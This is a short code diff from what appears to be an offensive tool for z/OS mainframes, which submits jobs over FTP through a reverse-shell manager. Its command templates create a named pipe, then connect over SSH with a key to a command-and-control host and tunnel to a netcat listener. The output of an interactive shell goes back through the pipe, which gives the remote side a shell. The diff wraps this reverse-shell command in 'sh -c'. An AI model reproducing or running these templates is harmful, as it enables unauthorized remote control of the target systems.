@@ -11,6 +11,7 @@ from zosutils import FTP, Job
 from reverseshellmanager import ReverseShellManager
 
 MKFIFO = 'SH mkfifo $FIFONAME'
+
 REVERSE_SH_SSH_TO_FILE = '''SH echo '
 ssh -i $KEYNAME $CCU@$CCS -p $CCP
 -o UserKnownHostsFile=$KNOWNHOSTSFILE
@@ -24,15 +25,18 @@ sh -s > $FIFONAME 2>&1
 ' > $TESTPATH
 '''
 
-REVERSE_SH_SSH = '''SH ssh -i $KEYNAME $CCU@$CCS -p $CCP
--o UserKnownHostsFile=$KNOWNHOSTSFILE
--o StrictHostKeyChecking=yes
--N
--W $NCIP:$NCP
-< $FIFONAME |
+REVERSE_SH_SSH = '''SH sh -c '
+ssh -i $KEYNAME 
+$CCU@$CCS 
+-p $CCP 
+-o UserKnownHostsFile=$KNOWNHOSTSFILE 
+-o StrictHostKeyChecking=yes 
+-N 
+-W $NCIP:$NCP 
+< $FIFONAME | 
 sh -s > $FIFONAME 2>&1
 & echo $STARTSEND 
-> $FIFONAME
+> $FIFONAME'
 '''
 
 def parse_configuration():
